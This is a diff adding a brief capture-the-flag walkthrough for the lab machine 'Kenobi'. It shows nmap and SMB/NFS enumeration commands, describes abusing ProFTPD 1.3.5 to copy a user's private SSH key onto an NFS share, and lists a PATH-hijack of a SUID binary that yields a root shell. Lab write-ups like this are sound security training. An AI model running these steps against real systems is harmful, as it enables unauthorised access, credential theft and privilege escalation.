@@ -1,0 +1,48 @@
+# kenobi
+
+## Step 1:
+
+nmap scan:
+
+`sudo nmap -sC -sV -O -A -p- 10.10.12.245 -oN nmap.txt`
+
+## Step 2:
+
+`nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.12.245`
+
+- Scan for SMB Shares and SMB users
+
+- Now scan for proFTP scan
+
+- This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve.
+
+`nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.12.245`
+
+## Step 3:
+
+- proftpd v1.3.5 is vulnerable to remote code execution without any type of authentication
+
+- Remotly execute some commands within internal system
+
+- copy ssh key from /home/kenobi/.ssh/id_rsa to /var/tmp
+
+- after the successful copy file then mount that directory to our system and then get the copy of the ssh key
+
+## Step 4
+
+- now to connect to the kenobi using ssh
+
+- find the unusual files from the system
+
+`find / -perm -u=s -type f 2>/opt/null`
+
+- **/usr/bin/menu** is unusual file and it have an root access
+
+- edit predefined command `curl`, change the permission, export to the path and execute the file `menu`; follow the command like:
+
+```
+echo /bin/sh > curl
+chmod 777 curl
+export PATH=/tmp:$PATH
+menu
+```
